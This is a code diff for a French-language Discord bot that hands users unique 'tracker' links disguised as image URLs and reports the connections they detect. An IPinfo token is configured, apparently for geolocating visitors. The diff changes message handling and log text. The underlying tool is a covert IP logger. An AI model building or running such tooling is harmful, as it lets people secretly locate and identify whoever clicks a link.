@@ -20,14 +20,12 @@ const {
   EmbedBuilder
 } = require('discord.js');
 
-// CONFIG
 const port = process.env.PORT || 3000;
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
 const TRACKER_BASE_URL = "https://tracker-09q2.onrender.com/image.jpg?u=";
 const BUTTON_CHANNEL_NAME = "📎・génère-lien-tracker";
 const CLIENTS_FILE = './clients.json';
-const TRACKER_MESSAGE_FILE = './tracker-message.json';
 
 const app = express();
 app.use(cors());
@@ -104,7 +102,7 @@ app.listen(port, () => {
 
 // DISCORD BOT
 const client = new Client({
-  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
+  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
   partials: [Partials.Channel]
 });
 
@@ -116,21 +114,13 @@ client.once(Events.ClientReady, async () => {
 
   if (!channel) return console.log("❌ Salon 'génère-lien-tracker' introuvable");
 
-  let messageId;
+  // Rechercher un ancien message du bot avec le tag spécial
+  const messages = await channel.messages.fetch({ limit: 10 });
+  const oldMsg = messages.find(msg => msg.author.id === client.user.id && msg.content.includes("[TRACKER_BOUTON]"));
 
-  if (fs.existsSync(TRACKER_MESSAGE_FILE)) {
-    const data = JSON.parse(fs.readFileSync(TRACKER_MESSAGE_FILE));
-    messageId = data.messageId;
-
-    try {
-      const msg = await channel.messages.fetch(messageId);
-      if (msg) {
-        console.log("✅ Message bouton déjà en place.");
-        return;
-      }
-    } catch (e) {
-      console.log("⚠️ Ancien message introuvable, on le recrée.");
-    }
+  if (oldMsg) {
+    console.log("✅ Message bouton déjà présent.");
+    return;
   }
 
   const bouton = new ButtonBuilder()
@@ -141,12 +131,12 @@ client.once(Events.ClientReady, async () => {
   const row = new ActionRowBuilder().addComponents(bouton);
 
   const message = await channel.send({
-    content: "🎯 Clique sur le bouton ci-dessous pour générer ton lien tracker personnalisé 👇",
+    content: "[TRACKER_BOUTON] 🎯 Clique sur le bouton ci-dessous pour générer ton lien tracker personnalisé 👇",
     components: [row]
   });
 
-  fs.writeFileSync(TRACKER_MESSAGE_FILE, JSON.stringify({ messageId: message.id }, null, 2));
-  console.log("✅ Message avec bouton envoyé !");
+  await message.pin();
+  console.log("✅ Message bouton envoyé et épinglé !");
 });
 
 client.on(Events.InteractionCreate, async interaction => {
@@ -176,7 +166,7 @@ client.on(Events.InteractionCreate, async interaction => {
     const trackerUrl = `${TRACKER_BASE_URL}${uniqueId}`;
 
     await privateChannel.send({
-      content: `🎯 Voici ton lien tracker unique :\n<${trackerUrl}>\n\n🕵️‍♂️ Les connexions détectées s'afficheront ici automatiquement.\n\n⏳ *Ce salon sera supprimé dans 15 minutes...*`
+      content: `🎯 Voici ton lien tracker unique :\n<${trackerUrl}>\n\n🕵️‍♂️ Les connexions détectées s'afficheront ici automatiquement.\n⏳ *Ce salon sera supprimé dans 15 minutes...*`
     });
 
     let clients = {};
@@ -192,18 +182,17 @@ client.on(Events.InteractionCreate, async interaction => {
       ephemeral: true
     });
 
-    // 🧹 Suppression du salon après 15 minutes
     setTimeout(async () => {
       try {
         await privateChannel.delete();
-        console.log(`🗑️ Salon supprimé : ${privateChannel.name}`);
+        console.log(`🗑️ Salon supprimé automatiquement : ${privateChannel.name}`);
       } catch (err) {
         console.error("❌ Erreur suppression salon :", err.message);
       }
-    }, 15 * 60 * 1000); // 15 min
+    }, 15 * 60 * 1000); // 15 minutes
 
   } catch (err) {
-    console.error("❌ Erreur interaction :", err);
+    console.error("❌ Erreur Interaction :", err);
     if (interaction.replied || interaction.deferred) {
       await interaction.editReply({ content: "❌ Une erreur est survenue." });
     } else {
